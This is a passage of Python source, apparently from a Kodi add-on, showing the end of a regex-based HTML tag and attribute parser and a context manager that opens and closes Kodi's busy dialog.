                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

